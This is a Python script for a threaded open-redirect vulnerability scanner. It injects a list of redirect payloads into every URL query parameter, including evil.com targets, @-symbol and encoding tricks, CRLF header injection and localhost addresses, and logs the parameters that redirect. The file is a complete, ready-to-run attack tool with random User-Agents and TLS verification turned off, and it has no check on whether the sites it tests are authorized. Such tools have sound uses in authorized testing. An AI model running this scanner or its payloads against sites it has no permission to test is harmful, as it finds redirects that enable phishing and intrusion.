import argparse
import requests
import random
from urllib.parse import urlparse, parse_qs, urlencode
from concurrent.futures import ThreadPoolExecutor
from colorama import init, Fore
import threading

# Initialize colorama
init(autoreset=True)

# Suppress only the single InsecureRequestWarning from urllib3 needed.
from urllib3.exceptions import InsecureRequestWarning
import urllib3
urllib3.disable_warnings(InsecureRequestWarning)

# List of User-Agent strings for random selection
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
    'Mozilla/5.0 (X11; Linux x86_64)',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)',
    # Add more User-Agent strings as needed
]

# Payloads with corresponding keywords to verify the redirect
payloads = [
    # Testing with common domains
    ("https://www.google.com", "Google"),
    ("https://www.example.com", "Example Domain"),
    ("https://www.evil.com", "Evil"),
    ("//www.google.com", "Google"),
    ("//www.example.com", "Example Domain"),
    ("//www.evil.com", "Evil"),
    # Encoded payloads
    ("%2F%2Fwww.google.com", "Google"),
    ("%2F%2Fwww.example.com", "Example Domain"),
    ("%2F%2Fwww.evil.com", "Evil"),
    # Variations with backslashes
    ("\\www.google.com", "Google"),
    ("\\www.example.com", "Example Domain"),
    ("\\www.evil.com", "Evil"),
    # Null byte injection
    ("https://www.google.com%00@www.evil.com", "Evil"),
    ("https://www.example.com%00@www.evil.com", "Evil"),
    # Multiple URL schemes
    ("http://www.google.com", "Google"),
    ("//google.com/", "Google"),
    ("//example.com/", "Example Domain"),
    # Adding parameters
    ("https://www.evil.com/?redirect=https://www.example.com", "Evil"),
    # Protocol-relative URLs
    ("//www.google.com/", "Google"),
    # Double encoding
    ("%252F%252Fwww.google.com", "Google"),
    ("%255cwww.google.com%255c..", "Google"),
    # Open redirect in fragments
    ("#https://www.evil.com", "Evil"),
    # Open redirect in path
    ("/https://www.evil.com", "Evil"),
    # Attacks using @ symbol
    ("https://www.google.com@www.evil.com", "Evil"),
    ("https://www.example.com@www.evil.com", "Evil"),
    # URL prefixing attacks
    ("//evil.com/%2f..", "Evil"),
    ("//www.google.com/%2f..", "Google"),
    # Mixed encoding
    ("%2F%2F%5Cwww.google.com", "Google"),
    ("%2F%2F%5Cwww.evil.com", "Evil"),
    # Unicode encoding
    ("%u2215%u2215www.google.com", "Google"),
    ("%u2215%u2215www.evil.com", "Evil"),
    # Injection of control characters
    ("%0d%0aLocation:%20https://www.evil.com", "Evil"),
    # Subdomain attacks
    ("https://evil.com@google.com", "Google"),
    ("https://google.com.evil.com", "Evil"),
    # Other common payloads
    ("//127.0.0.1", "localhost"),
    ("//localhost", "localhost"),
    ("//0.0.0.0", "localhost"),
    ("//[::1]", "localhost"),
]

# Initialize a lock for thread-safe operations
print_lock = threading.Lock()
file_lock = threading.Lock()

# Function to check for open redirects
def check_redirect(session, url, param, payload, keyword, max_retries=3, timeout=10, verbose=False):
    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query)

    # Replace the param value with the payload
    query_params[param] = payload
    new_query = urlencode(query_params, doseq=True)
    new_url = parsed_url._replace(query=new_query).geturl()

    for attempt in range(max_retries):
        try:
            response = session.get(new_url, allow_redirects=True, timeout=timeout, verify=False)

            # Check if we were redirected
            if len(response.history) > 0:
                final_url = response.url

                # Check if the final URL contains the payload target
                if payload.strip('/') in final_url or keyword.lower() in response.text.lower():
                    return True, new_url, final_url
            else:
                # Check for meta refresh or JavaScript redirects
                if keyword.lower() in response.text.lower():
                    return True, new_url, response.url

            return False, new_url, response.url

        except requests.RequestException as e:
            if verbose:
                with print_lock:
                    print(Fore.YELLOW + f"Request error ({e}), retrying ({attempt + 1}/{max_retries})...")
            continue  # Retry on error
    return None, new_url, None

# Function to process each URL
def process_url(url, output_file, max_retries, timeout, verbose):
    session = requests.Session()
    session.headers.update({'User-Agent': random.choice(USER_AGENTS)})

    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query)

    # If no parameters, return
    if not query_params:
        return

    # Test each parameter separately
    for param in query_params:
        for payload, keyword in payloads:
            result, test_url, final_url = check_redirect(session, url, param, payload, keyword, max_retries, timeout, verbose)
            if result:
                with print_lock:
                    print(Fore.GREEN + f"[VULNERABLE] Parameter '{param}' is vulnerable to open redirect.")
                    print(Fore.GREEN + f"Injected URL: {test_url}")
                    print(Fore.GREEN + f"Final URL: {final_url}\n")
                with file_lock:
                    with open(output_file, 'a') as f:
                        f.write(f"[VULNERABLE] {url}\n")
                        f.write(f"Parameter: {param}\n")
                        f.write(f"Injected URL: {test_url}\n")
                        f.write(f"Final URL: {final_url}\n")
                        f.write("-" * 80 + "\n")
                break  # Stop testing this parameter after finding a vulnerability
            elif result is False and verbose:
                with print_lock:
                    print(Fore.RED + f"[NOT VULNERABLE] {test_url}")
            # If result is None, it means all retries failed
            elif result is None and verbose:
                with print_lock:
                    print(Fore.YELLOW + f"[ERROR] Could not test {test_url} after {max_retries} attempts.")

    session.close()

# Main function
def main(input_file, output_file, threads, max_retries, timeout, verbose):
    try:
        with open(input_file, "r") as f:
            urls = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(Fore.RED + f"Input file '{input_file}' not found.")
        return

    if not urls:
        print(Fore.YELLOW + "No URLs to process.")
        return

    # Overwrite the output file at the start
    with open(output_file, 'w') as f:
        f.write("Open Redirect Vulnerability Scan Results\n")
        f.write("=" * 80 + "\n\n")

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = []
        for url in urls:
            futures.append(executor.submit(process_url, url, output_file, max_retries, timeout, verbose))

        # Optional: Wait for all threads to complete
        for future in futures:
            try:
                future.result()
            except Exception as e:
                with print_lock:
                    print(Fore.YELLOW + f"An error occurred: {e}")

    print(Fore.CYAN + f"\nScanning completed. Results saved to '{output_file}'.")

# Argument parser setup
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Open Redirect Vulnerability Scanner")
    parser.add_argument("-i", "--input", required=True, help="Input file with URLs")
    parser.add_argument("-o", "--output", required=True, help="Output file for results")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Number of threads (default: 10)")
    parser.add_argument("-r", "--retries", type=int, default=3, help="Maximum number of retries for a request (default: 3)")
    parser.add_argument("--timeout", type=int, default=10, help="Request timeout in seconds (default: 10)")
    parser.add_argument("-v", "--verbose", action='store_true', help="Enable verbose mode for detailed output")

    args = parser.parse_args()
    main(args.input, args.output, args.threads, args.retries, args.timeout, args.verbose)
